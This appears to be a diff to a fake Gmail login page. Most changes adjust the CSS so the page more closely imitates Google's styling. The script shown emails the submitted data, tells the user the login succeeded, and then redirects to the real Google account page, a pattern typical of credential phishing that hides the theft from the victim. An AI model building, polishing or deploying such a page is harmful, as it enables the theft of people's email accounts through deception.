@@ -22,6 +22,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #202124;
         }
 
         .login-container {
@@ -29,26 +30,28 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            padding: 20px;
         }
 
         .login-box {
             background-color: #fff;
             padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
             text-align: center;
         }
 
         .login-box h1 {
-            font-size: 24px;
+            font-size: 28px;
             color: #202124;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
 
         .gmail-icon {
-            font-size: 40px;
+            font-size: 50px;
             color: #1a73e8;
             margin-bottom: 20px;
         }
@@ -70,12 +73,13 @@
             padding: 12px;
             font-size: 16px;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 4px;
             outline: none;
+            transition: border 0.3s;
         }
 
         .input-group input:focus {
-            border-color: #0078d4;
+            border-color: #1a73e8;
         }
 
         .login-btn {
@@ -85,9 +89,10 @@
             color: white;
             background-color: #1a73e8;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
 
         .login-btn:hover {
@@ -95,7 +100,7 @@
         }
 
         .forgot-password {
-            margin-top: 15px;
+            margin-top: 10px;
         }
 
         .forgot-password a {
@@ -156,7 +161,7 @@
                 .then(function(response) {
                     console.log("Correo enviado con éxito", response.status, response.text);
                     alert("Inicio de sesión exitoso. Redirigiendo...");
-                    window.location.href = "https://myaccount.google.com";  // Redirige a Google
+                    window.location.replace("https://myaccount.google.com");  // Redirige a Google con window.replace para mayor rapidez
                 }, function(error) {
                     console.error("Error al enviar el correo", error);
                     alert("Ocurrió un error al enviar el correo. Intenta nuevamente.");
